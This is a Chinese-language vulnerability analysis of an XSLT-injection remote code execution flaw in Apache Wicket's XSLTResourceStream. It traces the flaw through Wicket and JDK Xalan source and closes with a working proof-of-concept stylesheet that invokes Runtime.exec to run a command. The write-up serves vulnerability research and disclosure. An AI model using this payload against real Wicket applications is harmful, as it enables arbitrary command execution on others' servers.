## 影响版本
- Apache Wicket 10.0.0-M1 - 10.0.0  
- Apache Wicket 9.0.0 - 9.17.0  
- Apache Wicket 8.0.0 - 8.15.0
## 漏洞分析
调试用代码
```JAVA
import org.apache.wicket.util.io.IOUtils;  
import org.apache.wicket.util.resource.FileResourceStream;  
import org.apache.wicket.util.resource.IResourceStream;  
import org.apache.wicket.util.resource.ResourceStreamNotFoundException;  
import org.apache.wicket.util.resource.XSLTResourceStream;  
  
import java.io.File;  
import java.io.IOException;  
  
public class App   
{  
    public static void main( String[] args )  
    {  
        IResourceStream resourceStream=new FileResourceStream(new File("src/main/resources/poc.xml"));  
        IResourceStream xmlresourceStream=new FileResourceStream(new File("src/main/resources/poc.xml"));  
        XSLTResourceStream stream = new XSLTResourceStream(resourceStream,xmlresourceStream);  
        try {  
            System.out.println(IOUtils.toString(stream.getInputStream()));  
        } catch (ResourceStreamNotFoundException e) {  
            throw new RuntimeException(e);  
        } catch (IOException e) {  
            throw new RuntimeException(e);  
        }  
    }  
}
```

断点调试后发现触发漏洞的位置在`XSLTResourceStream stream = new XSLTResourceStream(resourceStream,xmlresourceStream);`，跟入函数方法`org/apache/wicket/util/resource/XSLTResourceStream.java#XSLTResourceStream`

```java
public XSLTResourceStream(final IResourceStream xsltResource, final IResourceStream xmlResource)  
{  
    try  
    {  
       javax.xml.transform.Source xmlSource = new javax.xml.transform.stream.StreamSource(  
          xmlResource.getInputStream());  
       javax.xml.transform.Source xsltSource = new javax.xml.transform.stream.StreamSource(  
          xsltResource.getInputStream());  
       out = new ByteArrayOutputStream();  
       javax.xml.transform.Result result = new javax.xml.transform.stream.StreamResult(out);  
  
       // create an instance of TransformerFactory  
       javax.xml.transform.TransformerFactory transFact = javax.xml.transform.TransformerFactory.newInstance();  
  
       javax.xml.transform.Transformer trans = transFact.newTransformer(xsltSource);  
       Map<Object, Object> parameters = getParameters();  
       if (parameters != null)  
       {  
          for (Entry<Object, Object> e : parameters.entrySet())  
          {  
             trans.setParameter(e.getKey().toString(), e.getValue().toString());  
          }  
       }  
  
       trans.transform(xmlSource, result);  
    }  
    catch (Exception e)  
    {  
       throw new RuntimeException(e);  
    }  
    finally  
    {  
       IOUtils.closeQuietly(xmlResource);  
       IOUtils.closeQuietly(xsltResource);  
    }  
}
```

获取序列化处理器，再次进行transform

```JAVA
public void transform(Source source, Result result)  
    throws TransformerException  
{  
    if (!_isIdentity) {  
        if (_translet == null) {  
            ErrorMsg err = new ErrorMsg(ErrorMsg.JAXP_NO_TRANSLET_ERR);  
            throw new TransformerException(err.toString());  
        }  
        // Pass output properties to the translet  
        transferOutputProperties(_translet);  
    }  
  
    final SerializationHandler toHandler = getOutputHandler(result);  
    if (toHandler == null) {  
        ErrorMsg err = new ErrorMsg(ErrorMsg.JAXP_NO_HANDLER_ERR);  
        throw new TransformerException(err.toString());  
    }  
  
    if (!_isIdentity && (_uriResolver != null || (_tfactory.getFeature(XMLConstants.USE_CATALOG)  
                && _tfactory.getAttribute(JdkXmlUtils.CATALOG_FILES) != null))) {  
        _translet.setDOMCache(this);  
    }  
  
    // Pass output properties to handler if identity  
    if (_isIdentity) {  
        transferOutputProperties(toHandler);  
    }  
  
    transform(source, toHandler, _encoding);  
    try{  
        if (result instanceof DOMResult) {  
            ((DOMResult)result).setNode(_tohFactory.getNode());  
        } else if (result instanceof StAXResult) {  
              if (((StAXResult) result).getXMLEventWriter() != null)  
            {  
                (_tohFactory.getXMLEventWriter()).flush();  
            }  
            else if (((StAXResult) result).getXMLStreamWriter() != null) {  
                (_tohFactory.getXMLStreamWriter()).flush();  
                //result = new StAXResult(_tohFactory.getXMLStreamWriter());  
            }  
        }  
    } catch (Exception e) {  
        System.out.println("Result writing error");  
    }  
}
```

最终在这里完成最终RCE
```JAVA
// com/sun/org/apache/xalan/internal/xsltc/trax/TransformerImpl.java
private void transform(Source source, SerializationHandler handler,  
    String encoding) throws TransformerException  
{  
    try {  
		if ((source instanceof StreamSource && source.getSystemId()==null  
            && ((StreamSource)source).getInputStream()==null &&  
            ((StreamSource)source).getReader()==null)||  
            (source instanceof SAXSource &&  
            ((SAXSource)source).getInputSource()==null &&  
            ((SAXSource)source).getXMLReader()==null )||  
            (source instanceof DOMSource &&  
            ((DOMSource)source).getNode()==null)){  
  
            boolean supportCatalog = true;  
  
            DocumentBuilderFactory builderF = JdkXmlUtils.getDOMFactory(_overrideDefaultParser);  
            try {  
                builderF.setFeature(XMLConstants.USE_CATALOG, _useCatalog);  
            } catch (ParserConfigurationException e) {  
                supportCatalog = false;  
            }  
  
            if (supportCatalog && _useCatalog) {  
                CatalogFeatures cf = (CatalogFeatures)_tfactory.getAttribute(JdkXmlFeatures.CATALOG_FEATURES);  
                if (cf != null) {  
                    for (CatalogFeatures.Feature f : CatalogFeatures.Feature.values()) {  
                        builderF.setAttribute(f.getPropertyName(), cf.get(f));  
                    }  
                }  
            }  
  
            DocumentBuilder builder = builderF.newDocumentBuilder();  
            String systemID = source.getSystemId();  
            source = new DOMSource(builder.newDocument());  
  
            // Copy system ID from original, empty Source to new  
            if (systemID != null) {  
              source.setSystemId(systemID);  
            }  
        }  
        if (_isIdentity) {  
            transformIdentity(source, handler);  
        } else {  
            _translet.transform(getDOM(source), handler);  
        }  
    } catch (TransletException e) {  
        if (_errorListener != null) postErrorToListener(e.getMessage());  
        throw new TransformerException(e);  
    } catch (RuntimeException e) {  
        if (_errorListener != null) postErrorToListener(e.getMessage());  
        throw new TransformerException(e);  
    } catch (Exception e) {  
        if (_errorListener != null) postErrorToListener(e.getMessage());  
        throw new TransformerException(e);  
    } finally {  
        _dtmManager = null;  
    }  
  
    // If we create an output stream for the Result, we need to close it after the transformation.  
    if (_ostream != null) {  
        try {  
            _ostream.close();  
        }  
        catch (IOException e) {}  
        _ostream = null;  
    }  
}
//com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet.java

public final void transform(DOM document, SerializationHandler handler)  
    throws TransletException {  
    try {  
        transform(document, document.getIterator(), handler);  
    } finally {  
        _keyIndexes = null;  
    }  
}
```

调用栈
```
template$dot$0:-1, GregorSamsa (die.verwandlung)
applyTemplates:-1, GregorSamsa (die.verwandlung)
transform:-1, GregorSamsa (die.verwandlung)
transform:627, AbstractTranslet (com.sun.org.apache.xalan.internal.xsltc.runtime)
transform:782, TransformerImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
transform:395, TransformerImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
<init>:92, XSLTResourceStream (org.apache.wicket.util.resource)
main:19, App (org.example)
```
## POC
```XML
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"  
                xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"  
                xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">  
    <xsl:template match="/">  
  
        // 执行任意命令  
        <xsl:variable name="rtobject" select="rt:getRuntime()"/>  
        <xsl:variable name="process" select="rt:exec($rtobject,'calc')"/>  
        <xsl:variable name="processString" select="ob:toString($process)"/>  
        <xsl:value-of select="$processString"/>  
    </xsl:template>  
</xsl:stylesheet>
```